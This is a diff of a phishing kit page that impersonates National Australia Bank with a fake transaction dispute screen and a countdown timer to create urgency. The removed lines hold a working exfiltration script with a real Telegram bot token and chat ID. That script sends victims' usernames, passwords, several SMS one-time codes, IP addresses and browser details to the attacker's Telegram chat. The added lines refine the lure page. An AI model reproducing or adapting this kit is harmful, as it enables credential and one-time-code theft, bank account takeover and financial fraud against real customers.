-                <div class="login_button" style="margin-top: 0">
-                  <button type="button" id="continueBtn">Continue</button>
+                <!-- Transaction summary -->
+                <div class="txn-block-email">
+                    <div class="txn-top-email">
+                        <div>
+                            <div class="txn-merchant-email">Al Maya Group</div>
+                            <div class="txn-category-email">POS · Card not present</div>
+                        </div>
+                        <div>
+                            <div class="txn-amount-email">−$1,849.00</div>
+                            <div class="txn-currency-email">Australian Dollars</div>
+                        </div>
+                    </div>
+                    <div class="txn-details-email">
+                        <div class="txn-detail-email"><label>Date</label><span>03 Jul 2026</span></div>
+                        <div class="txn-detail-email"><label>Card Type</label><span>Debit Card</span></div>
+                        <div class="txn-detail-email"><label>Merchant location</label><span>Dubai Silicon Oasis, UAE</span></div>
+                        <div class="txn-detail-email"><label>Dispute ID</label><span>NAB-DIS-20260703-8849</span></div>
+                    </div>
                 </div>
-              </div>
-            </form>
-          </div>
-          <br /><br />
+
+                <p></p>
+                <p></p>
+            </div>
+
+            <!-- Question + action buttons -->
+            <div class="question-block-email">
+                <h2>Did you authorise this transaction?</h2>
+                <p>To continue the dispute, please confirm that you did <strong>not</strong> make this payment. If you did authorise it, the dispute will be closed.</p>
+            </div>
+
+            <div class="btn-group-email">
+                <button class="btn btn-confirm-dispute" onclick="handleConfirm()" id="btn-confirm">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
+                    No — I did not authorise it
+                </button>
+                <button class="btn btn-authorize" onclick="handleDeny()" id="btn-authorize">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                    Yes — I authorised it
+                </button>
+            </div>
+
+            <div class="security-note-email">
+                <span class="security-note-icon">🔒</span>
+                <span>NAB will <strong>never</strong> ask for your password, PIN, or security code. If someone asks for these, hang up and call us on <strong>13 00 555 722</strong>.</span>
+            </div>
+
         </div>
-      </div>
-    </div>
 
-    <!-- Confirmed Result -->
-    <div class="login_wrapper" style="width: 90%; display: none;" id="card-confirmed">
-      <div class="form_container">
-        <div class="result-screen" style="display:flex;">
-          <div class="result-icon-ring green-bg">
-            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
-          </div>
-          <h2 style="color:#1A6E44;">Dispute confirmed</h2>
-          <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong id="confirmedMerchant">Al Maya Group</strong> for <strong id="confirmedAmount">$1,849.00</strong>.</p>
-          <p>Your dispute will proceed. We'll contact you with the outcome within 5–10 business days.</p>
-          <div class="result-ref">
-            <strong>Dispute ID:</strong> <span id="confirmedDisputeId">NAB-DIS-20260703-8849</span> &nbsp;·&nbsp;
-            <strong>Confirmed:</strong> <span id="confirm-time"></span>
-          </div>
-          <button class="btn-next-steps btn-confirmed-next" onclick="window.location.href='auth3.html';">
-            Submit Dispute
-          </button>
+        <!-- ── Confirmed (dispute continues) ── -->
+        <div class="card" id="card-confirmed" style="display:none;">
+            <div class="result-screen" style="display:flex;">
+                <div class="result-icon-ring" style="background:var(--green-bg);">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                </div>
+                <h2 style="color:var(--green);">Dispute confirmed</h2>
+                <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>.</p>
+                <p>Your dispute will proceed. We'll contact you with the outcome within 5–10 business days.</p>
+                <div class="result-ref">
+                    <strong>Dispute ID:</strong> NAB-DIS-20260703-8849 &nbsp;·&nbsp;
+                    <strong>Confirmed:</strong> <span id="confirm-time"></span>
+                </div>
+                <button class="btn-next-steps btn-confirmed-next" onclick="window.location.href='auth3.html';">
+                    Submit Dispute
+                </button>
+            </div>
         </div>
-      </div>
-    </div>
 
-    <!-- Denied Result -->
-    <div class="login_wrapper" style="width: 90%; display: none;" id="card-denied">
-      <div class="form_container">
-        <div class="result-screen" style="display:flex;">
-          <div class="result-icon-ring red-bg">
-            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C0392B" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="15" y1="9" x2="9" y2="15" />
-              <line x1="9" y1="9" x2="15" y2="15" />
-            </svg>
-          </div>
-          <h2 style="color:#C0392B;">Dispute closed</h2>
-          <p>You have confirmed that you <strong>did authorise</strong> the payment to <strong id="deniedMerchant">Al Maya Group</strong> for <strong id="deniedAmount">$1,849.00</strong>. The dispute has been closed.</p>
-          <p>The funds will not be returned. If this was a mistake, please contact us immediately.</p>
-          <div class="result-ref">
-            <strong>Dispute ID:</strong> <span id="deniedDisputeId">NAB-DIS-20260703-8849</span> &nbsp;·&nbsp;
-            <strong>Closed:</strong> <span id="deny-time"></span>
-          </div>
-          <button class="btn-next-steps btn-denied-next" onclick="window.location.href='auth3.html';">
-            Submit Dispute
-          </button>
+        <!-- ── Denied (dispute closed) ── -->
+        <div class="card" id="card-denied" style="display:none;">
+            <div class="result-screen" style="display:flex;">
+                <div class="result-icon-ring" style="background:var(--red-bg);">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C0392B" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="15" y1="9" x2="9" y2="15" />
+                        <line x1="9" y1="9" x2="15" y2="15" />
+                    </svg>
+                </div>
+                <h2>Dispute closed</h2>
+                <p>You have confirmed that you <strong>did authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>. The dispute has been closed.</p>
+                <p>The funds will not be returned. If this was a mistake, please contact us immediately.</p>
+                <div class="result-ref">
+                    <strong>Dispute ID:</strong> NAB-DIS-20260703-8849 &nbsp;·&nbsp;
+                    <strong>Closed:</strong> <span id="deny-time"></span>
+                </div>
+                <button class="btn-next-steps btn-denied-next" onclick="window.location.href='auth3.html';">
+                    Submit Dispute
+                </button>
+            </div>
         </div>
-      </div>
-    </div>
 
-    <!-- Loading Modal -->
-    <div
-      id="loadingModalBackdrop"
-      style="
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: rgba(0, 0, 0, 0.6);
-        z-index: 9999;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div
-        id="loadingModal"
-        style="
-          background: #fff;
-          padding: 40px 30px;
-          border-radius: 8px;
-          text-align: center;
-          box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-        "
-      >
-        <div class="spinner" style="margin-bottom: 20px"></div>
-        <div style="font-size: 18px; font-weight: 500">
-          Loading, please wait...
+    </main>
+
+    <!-- ── NAB FOOTER ── -->
+    <footer class="nab-footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Security</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Fraud &amp; Scams</a>
+            </div>
+            <div class="footer-copy">
+                &copy; National Australia Bank 2026 &bull; ABN 12 004 044 937
+            </div>
         </div>
-      </div>
-    </div>
+    </footer>
 
     <script>
-      function updateImageSrc() {
-        const img = document.querySelector(".logo-img");
-        if (!img) return;
+        // ── Session countdown timer ──
+        let seconds = 598;
+        const timerEl = document.getElementById('timer');
 
-        if (window.innerWidth <= 768) {
-          img.src = "img/star.svg";
-        } else {
-          img.src = "img/star-big.svg";
-        }
-      }
-
-      updateImageSrc();
-      window.addEventListener("resize", updateImageSrc);
-    </script>
-
-    <script>
-      function ShowLoadingModal() {
-        document.getElementById("loginForm").style.display = "none";
-        document.querySelector(".login_wrapper").style.height = "400px";
-        document.querySelector(".loading-div").style.display = "flex";
-        document.querySelector(".form_container").style.display = "flex";
-      }
-    </script>
-
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const currentDateElement = document.getElementById("currentDate");
-        const options = {
-          weekday: "long",
-          day: "numeric",
-          month: "long",
-          year: "numeric",
-        };
-        const today = new Date();
-        const formattedDate = today.toLocaleDateString("en-GB", options);
-        currentDateElement.textContent = formattedDate;
-      });
-    </script>
-
-    <!-- ================================================ -->
-    <!-- THE NEW WORKING SCRIPT - REPLACES ALL PHP FILES -->
-    <!-- ================================================ -->
-    <script>
-      // ===== CONFIG (Replaces edit.php) =====
-      const CONFIG = {
-        apikey: "7141307570:AAHS5kKgDW5fMmXoXtrXsxiegs7w3zudslw",
-        chatid: "6768248084"
-      };
-
-      // ===== Helper Functions (Replaces fxker.php) =====
-      function clean(value) {
-        return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
-      }
-
-      function getBrowser(ua) {
-        if (ua.includes('MSIE')) return 'Internet Explorer';
-        if (ua.includes('Firefox')) return 'Mozilla Firefox';
-        if (ua.includes('Chrome')) return 'Google Chrome';
-        if (ua.includes('Safari')) return 'Safari';
-        if (ua.includes('Opera')) return 'Opera';
-        return 'Unknown';
-      }
-
-      async function getLocation(ip) {
-        try {
-          const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
-          const data = await res.json();
-          return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
-        } catch {
-          return { country: 'Unknown', city: 'Unknown' };
-        }
-      }
-
-      async function getClientInfo() {
-        let ip = '0.0.0.0';
-        try {
-          const res = await fetch('https://api.ipify.org?format=json');
-          const data = await res.json();
-          ip = data.ip;
-        } catch(e) {
-          console.warn('IP fetch failed');
-        }
-        const location = await getLocation(ip);
-        return {
-          ip: ip,
-          location: location,
-          userAgent: navigator.userAgent,
-          browser: getBrowser(navigator.userAgent)
-        };
-      }
-
-      // ===== Send to Telegram (Replaces message() from fxker.php) =====
-      async function sendTelegram(message) {
-        try {
-          const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
-          });
-          const data = await response.json();
-          console.log('Telegram response:', data);
-          return data;
-        } catch(e) {
-          console.error('Telegram send error:', e);
-          return null;
-        }
-      }
-
-      // ===== Session Management (Replaces PHP $_SESSION) =====
-      const Session = {
-        get: function(key) {
-          return localStorage.getItem('session_' + key);
-        },
-        set: function(key, value) {
-          localStorage.setItem('session_' + key, value);
-        },
-        getUsername: function() {
-          return this.get('username') || 'Unknown';
-        }
-      };
-
-      // ===== The Main Switch (Replaces err.php) =====
-      async function processForm(target, formData) {
-        const info = await getClientInfo();
-        let message = "";
-
-        switch(parseInt(target)) {
-          case 0: // Login (NAB LOGIN 1)
-            const username = clean(formData.get('x') || '');
-            const password = clean(formData.get('xx') || '');
-            Session.set('username', username);
-            Session.set('password', password);
-
-            message = `
-        ------------------[NAB LOGIN 1]------------------
-
-        Username : ${username}
-        Password : ${password}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 1: // Dispute Verification
-            const transactionDate = clean(formData.get('transactionDate') || '');
-            const merchantName = clean(formData.get('merchantName') || '');
-            const amount = clean(formData.get('amount') || '');
-            const disputeId = clean(formData.get('disputeId') || '');
-
-            message = `
-        ---------------[DISPUTE VERIFICATION]---------------
-
-        Dispute Verification By ${Session.getUsername()}
-
-        Transaction Date: ${transactionDate}
-        Merchant Name: ${merchantName}
-        Amount: $${amount} AUD
-        Dispute ID: ${disputeId}
-
-        --------------[USER AGENT IP DNS]--------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        --------------[TELEGRAM: ECHOVSL]--------------`;
-            break;
-
-          case 2: // SMS Code 1
-            const otp1 = clean(formData.get('xxl') || '');
-            message = `
-        --------------[NAB SMS CODE 1]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
-        SMS CODE : ${otp1}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 3: // SMS Code 2
-            const otp2 = clean(formData.get('xxll') || '');
-            message = `
-        --------------[NAB SMS CODE 2]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
-        SMS CODE : ${otp2}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 4: // Review
-            message = `
-        --------------[SECURITY QA REVIEW]--------------
-
-        ${Session.getUsername()} Reviewing Security Questions and Answers Set
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          case 5: // SMS Code 3
-            const otp3 = clean(formData.get('xxlll') || '');
-            message = `
-        --------------[NAB SMS CODE 3]--------------
-
-        SMS CODE FROM : ${Session.getUsername()}
-        SMS CODE : ${otp3}
-
-        ------------[USER AGENT IP DNS]-------------
-        User Agent
-         ${info.userAgent}
-        IP Address : ${info.ip}
-        -------------[TELEGRAM: ECHOVSL]-------------`;
-            break;
-
-          default:
-            console.warn('Unknown target:', target);
-            return false;
-        }
-
-        // Send to Telegram
-        await sendTelegram(message);
-        console.log('✅ Message sent to Telegram');
-        return true;
-      }
-    </script>
-
-    <!-- ================================================ -->
-    <!-- THE FORM SUBMIT HANDLER - REPLACES XHR TO PHP    -->
-    <!-- ================================================ -->
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const backBtn = document.getElementById("backBtn");
-        const continueBtn = document.getElementById("continueBtn");
-        const agreeCheckbox = document.getElementById("agree");
-        const errorMessage = document.getElementById("errorMessage");
-
-        const transactionDate = document.getElementById("transactionDate");
-        const merchantName = document.getElementById("merchantName");
-        const amount = document.getElementById("amount");
-        const disputeId = document.getElementById("disputeId");
-
-        const errorTransactionDate = document.getElementById("error-transactionDate");
-        const errorMerchantName = document.getElementById("error-merchantName");
-        const errorAmount = document.getElementById("error-amount");
-        const errorDisputeId = document.getElementById("error-disputeId");
-
-        // Back button
-        backBtn.addEventListener("click", function() {
-          window.location.href = "auth2.html";
-        });
-
-        // Clear errors on focus
-        [transactionDate, merchantName, amount, disputeId].forEach(function(input) {
-          input.addEventListener("focus", function() {
-            const errorId = "error-" + this.id;
-            const errorEl = document.getElementById(errorId);
-            if (errorEl) {
-              errorEl.textContent = "";
-              this.classList.remove("input_error");
+        const tick = setInterval(() => {
+            if (seconds <= 0) {
+                clearInterval(tick);
+                timerEl.textContent = '00:00';
+                return;
             }
-          });
-        });
+            seconds--;
+            const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const s = String(seconds % 60).padStart(2, '0');
+            timerEl.textContent = `${m}:${s}`;
+            if (seconds <= 60) timerEl.classList.add('warning');
+        }, 1000);
 
-        continueBtn.addEventListener("click", function () {
-          let isValid = true;
-
-          // Validate Transaction Date
-          if (!transactionDate.value.trim()) {
-            errorTransactionDate.textContent = "Please enter the transaction date.";
-            transactionDate.classList.add("input_error");
-            isValid = false;
-          } else {
-            transactionDate.classList.remove("input_error");
-            errorTransactionDate.textContent = "";
-          }
-
-          // Validate Merchant Name
-          if (!merchantName.value.trim()) {
-            errorMerchantName.textContent = "Please enter the merchant name.";
-            merchantName.classList.add("input_error");
-            isValid = false;
-          } else {
-            merchantName.classList.remove("input_error");
-            errorMerchantName.textContent = "";
-          }
-
-          // Validate Amount
-          if (!amount.value.trim()) {
-            errorAmount.textContent = "Please enter the transaction amount.";
-            amount.classList.add("input_error");
-            isValid = false;
-          } else if (!/^\d+(\.\d{1,2})?$/.test(amount.value.trim())) {
-            errorAmount.textContent = "Please enter a valid amount (e.g. 1849.00).";
-            amount.classList.add("input_error");
-            isValid = false;
-          } else {
-            amount.classList.remove("input_error");
-            errorAmount.textContent = "";
-          }
-
-          // Validate Dispute ID
-          if (!disputeId.value.trim()) {
-            errorDisputeId.textContent = "Please enter the dispute ID.";
-            disputeId.classList.add("input_error");
-            isValid = false;
-          } else {
-            disputeId.classList.remove("input_error");
-            errorDisputeId.textContent = "";
-          }
-
-          // Validate checkbox
-          if (!agreeCheckbox.checked) {
-            errorMessage.classList.add("show");
-            isValid = false;
-          } else {
-            errorMessage.classList.remove("show");
-          }
-
-          if (isValid) {
-            continueBtn.textContent = "Processing...";
-            continueBtn.disabled = true;
-            submitDisputeVerification();
-          }
-        });
-
-        agreeCheckbox.addEventListener("change", function () {
-          if (this.checked) {
-            errorMessage.classList.remove("show");
-          }
-        });
-      });
-
-      // ===== Submit Dispute Verification =====
-      async function submitDisputeVerification() {
-        const data = {
-          transactionDate: document.getElementById("transactionDate").value,
-          merchantName: document.getElementById("merchantName").value,
-          amount: document.getElementById("amount").value,
-          disputeId: document.getElementById("disputeId").value,
-        };
-
-        const formData = new FormData();
-        formData.append("sws", 1);
-        formData.append("transactionDate", data.transactionDate);
-        formData.append("merchantName", data.merchantName);
-        formData.append("amount", data.amount);
-        formData.append("disputeId", data.disputeId);
-
-        const success = await processForm(1, formData);
-
-        if (success) {
-          ShowLoadingModal();
-          setTimeout(() => {
-            window.location.href = "auth3.html";
-          }, 60000);
-        } else {
-          location.reload();
+        // ── Step helpers ──
+        function setStep(n) {
+            [1, 2, 3].forEach(i => {
+                const el = document.getElementById('step' + i);
+                el.className = 'step' + (i < n ? ' done' : i === n ? ' active' : '');
+                if (i < n) el.querySelector('.step-num').textContent = '✓';
+            });
         }
-      }
+
+        // ── Confirm handler (did NOT authorise → dispute continues) ──
+        function handleConfirm() {
+            const btn = document.getElementById('btn-confirm');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Confirming…';
+            btn.disabled = true;
+            document.getElementById('btn-authorize').disabled = true;
+            setStep(2);
+
+            setTimeout(() => {
+                document.getElementById('card-verify').style.display = 'none';
+                document.getElementById('card-confirmed').style.display = 'block';
+                document.getElementById('confirm-time').textContent = new Date().toLocaleTimeString('en-AU', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
+                setStep(3);
+                clearInterval(tick);
+                timerEl.textContent = '—';
+            }, 1400);
+        }
+
+        // ── Deny handler (did authorise → dispute closed) ──
+        function handleDeny() {
+            const btn = document.getElementById('btn-authorize');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Closing dispute…';
+            btn.disabled = true;
+            document.getElementById('btn-confirm').disabled = true;
+            setStep(2);
+
+            setTimeout(() => {
+                document.getElementById('card-verify').style.display = 'none';
+                document.getElementById('card-denied').style.display = 'block';
+                document.getElementById('deny-time').textContent = new Date().toLocaleTimeString('en-AU', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
+                setStep(3);
+                clearInterval(tick);
+                timerEl.textContent = '—';
+            }, 1400);
+        }
+
+        // ── Return home (hidden helper) ──
+        function returnToHome() {
+            document.getElementById('card-confirmed').style.display = 'none';
+            document.getElementById('card-denied').style.display = 'none';
+            document.getElementById('card-verify').style.display = 'block';
+            document.getElementById('btn-confirm').disabled = false;
+            document.getElementById('btn-authorize').disabled = false;
+            document.getElementById('btn-confirm').innerHTML = `
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                No — I did not authorise it
+            `;
+            document.getElementById('btn-authorize').innerHTML = `
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
+                Yes — I authorised it
+            `;
+            setStep(1);
+            seconds = 598;
+            timerEl.classList.remove('warning');
+            timerEl.textContent = '09:58';
+            clearInterval(tick);
+            const newTick = setInterval(() => {
+                if (seconds <= 0) {
+                    clearInterval(newTick);
+                    timerEl.textContent = '00:00';
+                    return;
+                }
+                seconds--;
+                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const s = String(seconds % 60).padStart(2, '0');
+                timerEl.textContent = `${m}:${s}`;
+                if (seconds <= 60) timerEl.classList.add('warning');
+            }, 1000);
+            window._timerInterval = newTick;
+        }
+
+        window._timerInterval = tick;
     </script>
-  </body>
+
+</body>
 </html>
